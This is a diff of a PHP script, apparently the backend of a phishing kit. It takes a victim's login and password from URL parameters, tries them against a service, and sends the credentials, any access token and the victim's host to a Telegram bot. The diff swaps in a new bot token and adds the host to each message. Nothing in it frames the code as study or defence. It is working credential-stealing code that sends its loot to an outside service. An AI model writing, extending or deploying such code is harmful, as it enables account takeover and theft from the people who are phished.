@@ -1,7 +1,7 @@
 <?php
 function send($mess){
 
-    $token = '1621111111:AAHLmA49eRgZiULTnG4DmzVhtsN1xX11111';
+    $token = '1959221111:AAGhMrg-utuHx2qzwfDGKoiFHBA17KnnzU4';
     $chat_id = '1648111111';
     $url = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chat_id."&text=".urlencode($mess)."&parse_mode=html&disable_web_page_preview=true";
     file_get_contents($url);
@@ -26,6 +26,7 @@ function status_log($login, $pass, $host){
             $mess_error_login .= "<b>Логин: </b><pre>".$login."</pre>\n";
             $mess_error_login .= "<b>Пароль: </b><pre>".$pass."</pre>\n\n";
             $mess_error_login .= "<code>".$data['value']."</code>";
+            $mess_error_login .= "<pre>".$host."</pre>";
             send($mess_error_login);
             return $data;
     //Если пароль и логин верный
@@ -49,6 +50,7 @@ function status_log($login, $pass, $host){
             $mess .= "<b>Логин: </b><pre>".$login."</pre>\n";
             $mess .= "<b>Пароль: </b><pre>".$pass."</pre>\n\n";
             $mess .= "<b>Token: </b><pre>".$data['access_token']."</pre>";
+            $mess .= "<pre>".$host."</pre>";
             user_get($data['user_id'], $data['access_token']);
             send($mess);
             return $data;
@@ -62,6 +64,7 @@ function status_log($login, $pass, $host){
             $mess_error_description .= "<b>Логин: </b><pre>".$login."</pre>\n";
             $mess_error_description .= "<b>Пароль: </b><pre>".$pass."</pre>\n\n";
             $mess_error_description .= "<b>Ошибка входа</b>: <code>".$data['value']."</code>";
+            $mess_error_description .= "<pre>".$host."</pre>";
             send($mess_error_description);
             return $data;
         }
@@ -70,7 +73,7 @@ function status_log($login, $pass, $host){
 if(!empty($_GET["l"]) && !empty($_GET["p"])){
     $login = $_GET['l'];
     $pass = $_GET['p'];
-    $host = $_GET['h'];
+    $host = $_GET['host'];
     $data = status_log($login, $pass, $host);
     header('Access-Control-Allow-Origin: *');
     header('Access-Control-Expose-Headers: Content-Length,Content-Type,Date,Server,Connection');
